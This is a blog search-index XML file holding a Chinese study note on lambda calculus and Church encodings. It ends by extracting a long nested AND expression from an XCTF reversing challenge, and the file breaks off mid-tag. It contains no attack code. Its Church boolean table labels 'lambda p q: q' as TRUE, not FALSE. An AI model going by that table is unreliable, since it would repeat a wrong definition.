<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Lambda Calculus</title>
    <link href="/2021/07/20/Lambda-Calculus/"/>
    <url>/2021/07/20/Lambda-Calculus/</url>
    
    <content type="html"><![CDATA[<h1 id="Lambda-Calculus"><a href="#Lambda-Calculus" class="headerlink" title="Lambda Calculus"></a>Lambda Calculus</h1><p>最近比赛经常遇到 lambda 出的题，于是记录一下 lambda 学习记录。</p><h2 id="Lambda-abstraction"><a href="#Lambda-abstraction" class="headerlink" title="Lambda abstraction"></a>Lambda abstraction</h2><p>定义函数的意思</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gml">(λ &lt;variable&gt;.&lt;expr&gt;)<br>λ<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>中λ为固定标记，标示着这是一个函数(function)，紧随其后的<span class="hljs-symbol">x</span>为这个函数的形式参数(formal parameters)，.之后的<span class="hljs-symbol">x</span>为这个函数的函数体。<br></code></pre></td></tr></table></figure><h2 id="currying"><a href="#currying" class="headerlink" title="currying"></a>currying</h2><p>lambda 一般有一个形参，如果要支持多个形参就要对表达式变形</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">λxy.<span class="hljs-symbol">x</span>*<span class="hljs-symbol">x</span> + <span class="hljs-symbol">y</span>*<span class="hljs-symbol">y</span><br></code></pre></td></tr></table></figure><p>可以将其改写为等价的如下函数:</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">λ<span class="hljs-symbol">x</span>.(λ<span class="hljs-symbol">y</span>.<span class="hljs-symbol">x</span>*<span class="hljs-symbol">x</span> + <span class="hljs-symbol">y</span>*<span class="hljs-symbol">y</span>)<br></code></pre></td></tr></table></figure><h2 id="α-conversion"><a href="#α-conversion" class="headerlink" title="α-conversion"></a>α-conversion</h2><p>换名规则？参数名换了不影响函数功能。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">λ<span class="hljs-selector-tag">x</span><span class="hljs-selector-class">.xy</span><br></code></pre></td></tr></table></figure><p>λx.xy需要引入变量绑定(variable binding)的规则。其中x被称为绑定变量(binding variable)，而y则称为自由变量(free variable)。形式参数x的值将替换到在xy中的x上，而y的值却依λx.xy被调用时的上下文而定，这样的函数和其关联自由变量的引用作用域被称为闭包(closure)。</p><p>对λx.xy绑定变量x进行改名后可得到一个新的函数:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">λ<span class="hljs-selector-tag">z</span><span class="hljs-selector-class">.zy</span><br></code></pre></td></tr></table></figure><h2 id="Beta-Reduction"><a href="#Beta-Reduction" class="headerlink" title="Beta Reduction"></a>Beta Reduction</h2><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name"><span class="hljs-builtin-name">lambda</span></span> <span class="hljs-name">x</span> <span class="hljs-name">.</span> <span class="hljs-name">x</span> <span class="hljs-name"><span class="hljs-builtin-name">+</span></span> <span class="hljs-name">1</span>)<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>将 3 代入，替换成 3 + 1</p><p>例2</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">lambda <span class="hljs-symbol">y</span> . (lambda <span class="hljs-symbol">x</span> . <span class="hljs-symbol">x</span> + <span class="hljs-symbol">y</span>)) q<br></code></pre></td></tr></table></figure><p>替换结果是</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">lambda <span class="hljs-symbol">x</span>. <span class="hljs-symbol">x</span>+q<br></code></pre></td></tr></table></figure><h2 id="Church-Boolean"><a href="#Church-Boolean" class="headerlink" title="Church Boolean"></a>Church Boolean</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">lambda <span class="hljs-selector-tag">p</span> <span class="hljs-selector-tag">q</span>: <span class="hljs-selector-tag">p</span> <span class="hljs-selector-tag">q</span> <span class="hljs-selector-tag">p</span> =&gt; AND<br>lambda <span class="hljs-selector-tag">p</span> <span class="hljs-selector-tag">q</span>: <span class="hljs-selector-tag">p</span> <span class="hljs-selector-tag">p</span> <span class="hljs-selector-tag">q</span> =&gt; OR<br>lambda <span class="hljs-selector-tag">p</span> <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">b</span>: <span class="hljs-selector-tag">p</span> <span class="hljs-selector-tag">b</span> <span class="hljs-selector-tag">a</span> =&gt; NOT<br>lambda <span class="hljs-selector-tag">p</span> <span class="hljs-selector-tag">q</span>: <span class="hljs-selector-tag">p</span> =&gt; TRUE<br>lambda <span class="hljs-selector-tag">p</span> <span class="hljs-selector-tag">q</span>: <span class="hljs-selector-tag">q</span> =&gt; TRUE<br></code></pre></td></tr></table></figure><h2 id="Church-Numberals"><a href="#Church-Numberals" class="headerlink" title="Church Numberals"></a>Church Numberals</h2><img src="/2021/07/20/Lambda-Calculus/image-20210720114642141.png" class="" title="image-20210720114642141"><img src="/2021/07/20/Lambda-Calculus/image-20210720114654776.png" class="" title="image-20210720114654776"><img src="/2021/07/20/Lambda-Calculus/image-20210720114707087.png" class="" title="image-20210720114707087"><h2 id="XCTF-lambda"><a href="#XCTF-lambda" class="headerlink" title="XCTF lambda"></a>XCTF lambda</h2><p>XCTF Final 第一次遇到 lambda 题目，当时不会做。这道题目实现了 lambda 模拟器，实现了 Church Boolean 运算。</p><p>提取原始表达式，并根据 Church Boolean 的规则简单化简，得到表达式如下</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scheme">[<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;AND</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span 